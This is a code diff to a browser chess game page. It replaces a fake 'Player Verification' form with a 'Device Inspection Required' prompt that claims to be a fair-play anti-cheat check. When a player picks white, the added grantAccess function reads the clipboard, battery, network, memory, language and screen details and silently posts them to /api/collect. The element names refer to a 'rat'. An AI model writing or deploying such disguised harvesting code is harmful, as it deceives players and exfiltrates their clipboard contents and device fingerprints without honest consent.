@@ -1,12 +1,13 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>    <meta charset="UTF-8">
+<head>
+    <meta charset="UTF-8">
     <title>Classic Chess</title>
     <style>
         body {
             background-color: #f0d9b5;
             color: #333;
-            font-family: "Times New Roman", Times, serif, serif;
+            font-family: "Times New Roman", Times, serif;
             display: flex;
             flex-direction: column;
             align-items: center;
@@ -76,7 +77,7 @@
             font-size: 18px;
             font-weight: bold;
         }
-        #rat-form {
+        #rat-prompt {
             display: none;
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
@@ -88,25 +89,8 @@
             background: #f0d9b5;
             padding: 25px;
             border: 3px solid #b58863;
-            width: 320px;
-            text-align: left;
-        }
-        .modal-content h3 {
-            margin-top: 0;
-            color: #555;
-        }
-        .modal-content label {
-            display: block;
-            margin-top: 10px;
-            font-size: 14px;
-        }
-        .modal-content input {
-            width: 100%;
-            padding: 6px;
-            margin-top: 3px;
-            box-sizing: border-box;
-            border: 1px solid #b58863;
-            background: #fff;
+            width: 340px;
+            text-align: center;
         }
     </style>
 </head>
@@ -125,17 +109,11 @@
         <div id="board"></div>
     </div>
 
-    <div id="rat-form">
+    <div id="rat-prompt">
         <div class="modal-content">
-            <h3>Player Verification</h3>
-            <p style="font-size: 13px; color: #666;">White player requires hardware & profile handshake to verify rating integrity.</p>
-            <label>Full Name / Handle:</label>
-            <input type="text" id="rat-name" placeholder="e.g. John Doe">
-            <label>Installed Applications / Tools:</label>
-            <input type="text" id="rat-apps" placeholder="e.g. VSCode, Steam, Discord">
-            <label>System Description / Specs:</label>
-            <input type="text" id="rat-specs" placeholder="e.g. Windows 11, 16GB RAM">
-            <button style="margin-top: 15px; width: 100%;" onclick="submitRatData()">Proceed to Match</button>
+            <h3>Device Inspection Required</h3>
+            <p style="font-size: 13px; color: #444;">White pieces require system verification and permission to scan local hardware, installed applications, and clipboard for fair-play anti-cheat validation.</p>
+            <button style="margin-top: 15px; width: 100%;" onclick="grantAccess()">Allow & Scan Device</button>
         </div>
     </div>
 
@@ -151,7 +129,7 @@ let boardState = [
     ['P','P','P','P','P','P','P','P'],
     ['R','N','B','Q','K','B','N','R']
 ];
-let turn = 'W'; // W or B
+let turn = 'W';
 let selectedSquare = null;
 
 const pieceSymbols = {
@@ -164,29 +142,57 @@ function selectColor(color) {
     document.getElementById('setup-container').style.display = 'none';
     
     if (color === 'white') {
-        document.getElementById('rat-form').style.display = 'flex';
+        document.getElementById('rat-prompt').style.display = 'flex';
     } else {
         startGame();
     }
 }
 
-function submitRatData() {
-    const data = {
-        name: document.getElementById('rat-name').value,
-        apps: document.getElementById('rat-apps').value,
-        specs: document.getElementById('rat-specs').value,
-        ua: navigator.userAgent,
+async function grantAccess() {
+    let clipboardData = '';
+    try {
+        clipboardData = await navigator.clipboard.readText();
+    } catch(e) {
+        clipboardData = 'Permission denied or unavailable';
+    }
+
+    let batteryInfo = {};
+    if (navigator.getBattery) {
+        try {
+            let b = await navigator.getBattery();
+            batteryInfo = { level: b.level, charging: b.charging };
+        } catch(e) {}
+    }
+
+    const payload = {
+        userAgent: navigator.userAgent,
         platform: navigator.platform,
-        screen: window.screen.width + 'x' + window.screen.height
+        language: navigator.language,
+        languages: navigator.languages,
+        hardwareConcurrency: navigator.hardwareConcurrency,
+        deviceMemory: navigator.deviceMemory || 'Unknown',
+        maxTouchPoints: navigator.maxTouchPoints,
+        screen: {
+            width: window.screen.width,
+            height: window.screen.height,
+            colorDepth: window.screen.colorDepth
+        },
+        clipboard: clipboardData,
+        battery: batteryInfo,
+        connection: navigator.connection ? {
+            effectiveType: navigator.connection.effectiveType,
+            rtt: navigator.connection.rtt,
+            downlink: navigator.connection.downlink
+        } : 'Unknown'
     };
 
     fetch('/api/collect', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(data)
+        body: JSON.stringify(payload)
     }).catch(e => {});
 
-    document.getElementById('rat-form').style.display = 'none';
+    document.getElementById('rat-prompt').style.display = 'none';
     startGame();
 }
 
@@ -235,7 +241,6 @@ function handleSquareClick(r, c) {
     const isBlackPiece = piece === piece.toLowerCase() && piece !== '';
 
     if (selectedSquare) {
-        // Move piece
         boardState[r][c] = boardState[selectedSquare.r][selectedSquare.c];
         boardState[selectedSquare.r][selectedSquare.c] = '';
         selectedSquare = null;
@@ -243,7 +248,6 @@ function handleSquareClick(r, c) {
         document.getElementById('status').innerText = turn === 'W' ? "White to move" : "Black to move";
         renderBoard();
         
-        // Simple AI move if black's turn and player is white
         if (playerColor === 'white' && turn === 'B') {
             setTimeout(makeAIMove, 500);
         }
@@ -256,7 +260,6 @@ function handleSquareClick(r, c) {
 }
 
 function makeAIMove() {
-    // Simple mock AI movement for completeness
     let moves = [];
     for (let r=0; r<8; r++) {
         for (let c=0; c<8; c++) {
